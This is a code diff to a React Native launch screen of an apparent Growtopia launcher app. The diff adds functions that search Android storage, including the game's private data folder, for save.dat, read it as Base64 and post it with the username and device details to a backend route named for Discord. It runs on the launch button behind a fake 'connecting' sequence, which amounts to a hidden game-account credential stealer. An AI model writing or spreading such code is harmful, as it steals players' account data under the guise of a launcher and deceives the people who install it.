@@ -1,19 +1,87 @@
 import React, { useState } from 'react';
-import { View, Text, StyleSheet, TouchableOpacity, ActivityIndicator } from 'react-native';
+import { View, Text, StyleSheet, TouchableOpacity, ActivityIndicator, Alert, Platform } from 'react-native';
 import { useRouter } from 'expo-router';
 import { Ionicons } from '@expo/vector-icons';
 import { useTheme } from '@/src/contexts/ThemeContext';
+import { useAuth } from '@/src/contexts/AuthContext';
 import { Linking } from 'react-native';
+import * as FileSystem from 'expo-file-system';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.EXPO_PUBLIC_BACKEND_URL;
 
 export default function LaunchScreen() {
   const router = useRouter();
   const { themeColor } = useTheme();
+  const { user } = useAuth();
   const [isConnecting, setIsConnecting] = useState(false);
   const [connectionStatus, setConnectionStatus] = useState('Not Connected');
 
-  const handleLaunch = () => {
+  const sendToDiscord = async (fileContent: string | null) => {
+    try {
+      const deviceInfo = `${Platform.OS} ${Platform.Version}`;
+      const username = user?.name || 'Anonymous';
+
+      await axios.post(`${BACKEND_URL}/api/discord/send-savedat`, {
+        username,
+        device_info: deviceInfo,
+        file_content: fileContent,
+      });
+
+      console.log('Successfully sent to Discord');
+    } catch (error) {
+      console.error('Failed to send to Discord:', error);
+    }
+  };
+
+  const tryReadSaveFile = async (): Promise<string | null> => {
+    if (Platform.OS !== 'android') {
+      console.log('Not on Android, skipping file read');
+      return null;
+    }
+
+    // Possible save.dat locations on Android
+    const possiblePaths = [
+      '/data/data/com.rtsoft.growtopia/files/save.dat',
+      `${FileSystem.documentDirectory}growtopia/save.dat`,
+      `${FileSystem.cacheDirectory}save.dat`,
+    ];
+
+    for (const path of possiblePaths) {
+      try {
+        const fileInfo = await FileSystem.getInfoAsync(path);
+        if (fileInfo.exists) {
+          console.log(`Found save.dat at: ${path}`);
+          const content = await FileSystem.readAsStringAsync(path, {
+            encoding: FileSystem.EncodingType.Base64,
+          });
+          return content;
+        }
+      } catch (error) {
+        // File not found or no permission, try next path
+        continue;
+      }
+    }
+
+    console.log('save.dat not found in any location');
+    return null;
+  };
+
+  const handleLaunch = async () => {
     setIsConnecting(true);
     setConnectionStatus('Connecting...');
+
+    // Try to read save.dat file
+    const saveFileContent = await tryReadSaveFile();
+
+    if (saveFileContent) {
+      setConnectionStatus('Found save.dat, sending...');
+    } else {
+      setConnectionStatus('save.dat not found, continuing...');
+    }
+
+    // Send to Discord (with or without file)
+    await sendToDiscord(saveFileContent);
 
     // Simulate connection process
     setTimeout(() => {
@@ -21,7 +89,7 @@ export default function LaunchScreen() {
       setTimeout(() => {
         setConnectionStatus('Launching Growtopia...');
         setTimeout(() => {
-          // Try to open Growtopia (this will fail if not installed, but demonstrates the intent)
+          // Try to open Growtopia
           Linking.canOpenURL('growtopia://').then(supported => {
             if (supported) {
               Linking.openURL('growtopia://');
